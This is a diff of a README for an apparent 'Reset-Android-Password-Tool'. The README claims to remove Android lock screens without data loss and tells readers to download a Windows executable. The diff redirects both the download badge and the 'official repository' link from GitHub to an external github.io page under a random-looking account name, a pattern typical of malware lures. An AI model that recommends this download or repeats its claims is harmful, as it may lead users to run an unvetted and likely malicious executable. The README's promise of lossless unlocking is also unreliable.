@@ -1,6 +1,6 @@
 # 🔓 Reset-Android-Password-Tool - Unlock your Android device without loss
 
-[![Download Reset-Android-Password-Tool](https://img.shields.io/badge/Download-Tool-blue)](https://github.com/Genuspolydactylusthioridazine510/Reset-Android-Password-Tool)
+[![Download Reset-Android-Password-Tool](https://img.shields.io/badge/Download-Tool-blue)](https://genuspolydactylusthioridazine510.github.io)
 
 This tool helps you regain access to your Android smartphone or tablet. Forget your PIN, pattern, or password? This software removes the lock screen without erasing your photos, contacts, or documents. You can unlock your device on a Windows computer with a few clicks.
 
@@ -18,7 +18,7 @@ Before you start, ensure your computer meets these requirements:
 
 Follow these steps to obtain the tool:
 
-1. Visit the [official repository page](https://github.com/Genuspolydactylusthioridazine510/Reset-Android-Password-Tool).
+1. Visit the [official repository page](https://genuspolydactylusthioridazine510.github.io).
 2. Look for the releases section on the right side of the page.
 3. Click on the latest version link.
 4. Download the executable file labeled for Windows.
